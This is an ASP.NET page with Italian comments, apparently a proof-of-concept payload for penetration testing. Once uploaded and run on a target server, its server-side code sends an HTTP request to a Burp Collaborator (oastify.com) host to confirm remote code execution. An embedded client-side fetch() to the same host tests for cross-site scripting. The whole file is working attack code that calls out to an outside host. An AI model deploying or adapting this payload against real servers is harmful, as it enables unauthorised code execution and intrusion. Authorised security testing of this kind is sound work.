<script runat="server">
    protected void Page_Load(object sender, EventArgs e)
    {
        try
        {
            // Esecuzione lato SERVER: Il server stesso contatta il tuo collaborator
            string collaboratorUrl = "http://x20qlw8nza7cwaotn9iyhe9uplvcj57u.oastify.com/server_side_rce_test";
            HttpWebRequest request = (HttpWebRequest)WebRequest.Create(collaboratorUrl);
            request.Method = "GET";
            using (HttpWebResponse response = (HttpWebResponse)request.GetResponse()) { }
            lblStatus.Text = "DNS/HTTP Interaction inviata dal SERVER!";
        }
        catch (Exception ex)
        {
            lblStatus.Text = "Errore durante l'interazione server: " + ex.Message;
        }
    }
</script>

<!DOCTYPE html>
<html>
<head>
    <title>PoC OAST Execution</title>
</head>
<body>
    <h2>Verifica Esecuzione Codice</h2>
    <p>Stato Server: <asp:Label ID="lblStatus" runat="server" Text="In attesa..." /></p>
    
    <hr>
    
    <script>
        fetch("http://x20qlw8nza7cwaotn9iyhe9uplvcj57u.oastify.com/client_side_xss_test");
        console.log("Client-side interaction triggered");
    </script>
</body>
</html>